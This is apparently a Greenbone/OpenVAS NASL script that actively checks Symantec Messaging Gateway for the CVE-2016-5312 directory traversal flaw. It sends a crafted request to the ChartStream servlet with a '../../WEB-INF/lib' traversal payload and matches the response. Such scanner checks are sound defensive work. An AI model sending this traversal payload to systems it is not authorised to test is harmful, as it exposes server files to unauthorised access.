# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:symantec:messaging_gateway";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807891");
  script_version("2024-02-02T14:37:52+0000");
  script_tag(name:"last_modification", value:"2024-02-02 14:37:52 +0000 (Fri, 02 Feb 2024)");
  script_tag(name:"creation_date", value:"2016-09-30 10:38:42 +0530 (Fri, 30 Sep 2016)");
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-04-22 14:16:00 +0000 (Sat, 22 Apr 2017)");

  script_cve_id("CVE-2016-5312");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Symantec Messaging Gateway Directory Traversal Vulnerability (SYM16-016) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_symantec_messaging_gateway_consolidation.nasl");
  script_mandatory_keys("symantec/smg/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"Symantec Messaging Gateway is prone to a directory traversal
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw exists due to error in the charting component in the
  Symantec Messaging Gateway which does not properly sanitize user input submitted for charting
  requests.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to access to some
  files/directories on the server for which the user is not authorized.");

  script_tag(name:"affected", value:"Symantec Messaging Gateway prior to version 10.6.2.");

  script_tag(name:"solution", value:"Update to version 10.6.2 or later.");

  script_xref(name:"URL", value:"https://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&amp;pvid=security_advisory&amp;year=&amp;suid=20160927_00");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/93148");


  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/lib";

if (http_vuln_check(port: port, url: url,  pattern:"sun-mail", check_header: TRUE,
                    extra_check: make_list("rngpack", "apache-mime", "vontu-detection"))) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
